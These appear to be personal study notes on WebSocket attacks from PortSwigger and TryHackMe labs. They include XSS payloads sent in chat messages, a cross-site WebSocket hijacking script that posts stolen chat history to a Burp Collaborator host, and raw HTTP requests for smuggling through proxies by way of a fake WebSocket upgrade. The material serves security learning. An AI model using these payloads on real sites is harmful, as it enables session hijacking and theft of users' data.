
## Manipulating WebSockets connections
There are various situations in which manipulating the WebSocket handshake might be necessary:
- It can enable you to reach more attack surface.
- Some attacks might cause your connection to drop so you need to establish a new one.
- Tokens or other data in the original handshake request might be stale and need updating.


Suppose a chat application uses WebSockets to send chat messages between the browser and the server. When a user types a chat message, a WebSocket message like the following is sent to the server:
- `{"message":"Hello Carlos"}`
- Then it gets rendered as HTML
- Then you can try: `{"message":"<img src=1 onerror='alert(1)'>"}`


WebSocket handshake vulnerabilities:
- Misplaced trust in HTTP headers to perform security decisions, such as the `X-Forwarded-For` header.
- Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.
- Attack surface introduced by custom HTTP headers used by the application.

## Cross-Site WebSocket hijacking 
- Relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values in request parameters
	- This is the first thing to check
	- Note that the `Sec-WebSocket-Key` header contains a random value to prevent errors from caching proxies, and is not used for authentication or session handling purposes.
- Attacker creates a malicious web page on their own domain which establishes a cross-site WebSocket connection to the vulnerable application. The application will handle the connection in the context of the victim user's session with the application.
- Two-way communication, more dangerous that regular CSRF

`<img src=1 oNeRrOr=alert'1'>`
- WHen `<img src=1 onerror=alert'1'>` didn't work

You may be able to reconnect using the `X-Forwarded-For:` Header

## Using Cross-Site WebSockets to exploit other vulnerabilities

```
<script>
    var ws = new WebSocket('wss://0a9400d3031767af80b503260055002a.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://slh7uxlc3cxuroxh5kv6vp78zz5qtgh5.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

- where wss://link is the websocket URL shown in the websocket history
- https://slh7uxlc3cxuroxh5kv6vp78zz5qtgh5.oastify.com is the burp collaborator URL
- Apparently needed to see that the "READY" command retrieves past chat messages from the server in the WebSockets history tab 
	- AND to observe that the request has no CSRF tokens

# Web Socket Request Smuggling (THM)

The WebSocket protocol allows the creation of two-way communication channels between a browser and a server by establishing a long-lasting connection that can be used for full-duplex communications. Once the connection between the client and the backend server is established, it persists. 

Requires:
- Header: `Upgrade: websocket` 
- Header: `Sec-Websocket-Version: ???`
- Header: `Sec-Websocket-Key: base64String`
- Response: `101 Switching Protocols` response

Some proxies may assume that the upgrade is always completed, regardless of the server response. This can be abused to smuggle HTTP requests once again by performing the following steps:

1. The client sends a WebSocket upgrade request with an *invalid* version number.
2. The proxy forwards the request to the backend server.
3. The backend server responds with `426 Upgrade Required`. The connection doesn't upgrade, so the backend remains using HTTP instead of switching to a WebSocket connection.
4. The proxy doesn't check the server response and assumes the upgrade was successful. Any further communications will be tunneled since the proxy believes they are part of an upgraded WebSocket connection.

**Essentially we are pretending to use a websocket but not actually doing it to smuggle our request.** 
- Again, we can't poison others, we can only tunnel. 
- We may not even necessarily need the WebSockets to be real for this to work. 

Example request:
```default
GET /socket HTTP/1.1
Host: 10.10.100.248:8001
Sec-WebSocket-Version: 777
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: 10.10.100.248:8001
```


### Defeating Secure Proxies
- meaning proxies that actually do check whether the upgrade was successful
We need to find a way to trick the proxy into believing a valid WebSocket connection has been established. This means we need to somehow force the backend web server to reply to our upgrade request with a fake `101 Switching Protocols` response without actually upgrading the connection in the backend
- We might be able to inject the `101 Switching Protocols` response to an arbitrary request if our target app has some vulnerability that allows us to proxy requests back to a server we control

In the example, we are working with an application that takes a URL as an input and checks it. Ex:

```
GET /check-url?server=http://10.13.73.142:5555 HTTP/1.1
Host: 10.10.14.81:8002
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: 10.10.14.81:8002


```
- *Note that we needed to put two blank lines at the end*







































